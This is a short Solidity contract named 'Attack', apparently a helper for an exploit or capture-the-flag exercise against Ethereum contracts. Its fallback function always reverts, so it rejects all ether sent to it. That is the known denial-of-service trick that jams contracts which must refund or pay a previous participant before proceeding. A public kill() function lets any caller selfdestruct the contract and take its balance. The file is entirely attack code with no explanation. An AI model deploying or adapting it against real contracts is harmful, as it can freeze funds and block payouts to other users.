ragma solidity ^0.4.23;

contract Attack {
    function kill() public {
        selfdestruct(msg.sender);
    }
    
    function() public payable {
        assert(false);
    }
}
